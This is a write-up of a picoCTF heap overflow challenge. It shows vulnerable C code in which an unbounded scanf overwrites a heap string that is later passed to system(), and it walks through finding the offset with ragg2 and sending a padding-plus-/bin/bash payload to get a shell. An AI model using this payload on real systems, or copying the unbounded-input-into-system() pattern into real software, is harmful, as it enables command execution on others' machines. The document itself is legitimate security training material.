# URL
https://play.picoctf.org/practice/challenge/526
# Concept
* head buffer overflow
* variable overwrite
# Source code
```
#include <stdlib.h>
#include <string.h>

int main(void) {
        char* username = malloc(28);
        char* shell = malloc(28);

        printf("username at %p\n", username);
    fflush(stdout);
        printf("shell at %p\n", shell);
    fflush(stdout);

        strcpy(shell, "/bin/pwd");

        printf("Enter username: ");
    fflush(stdout);
        scanf("%s", username);

        printf("Hello, %s. Your shell is %s.\n", username, shell);
        system(shell);
    fflush(stdout);

        return 0;
}
```
# Method of solve
* in the source code we see that the `system` function is being used to run the `shell` variable
* the `shell` variable is set to `/bin/pwd` by default using the `strcpy` function
* we have a user-controlled variable called `username` which is recorded by the `scanf` function
* we see that both `shell` and `username` are initialized on the memory heap with sizes of 28 bytes each
```
char* username = malloc(28);
char* shell = malloc(28);
```
* so `scanf` records `username`, and username is allocated 28 bytes on the heap. If user input in excess of 28 bytes is recorded, the excess will be overflowed into the memory heap
* the goal is to overflow into the `shell` variable and overwrite its contents with the system command we want to run
* we can get offset to reach the `shell` variable using the following command to create a predictable pattern of characters:
```
ragg2 -P 58 -r
```
* we can feed the result string into the program, then take the value of `shell` and convert that string to hex
* then use this command to get the offset:
```
ragg2 -q 0x5141415241415341
```
* from here we can send the appropriate offset, then end it with `/bin/bash` command to open an interactive shell with the server:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/bash
```
* from there, read the `flag.txt` file and we're done!

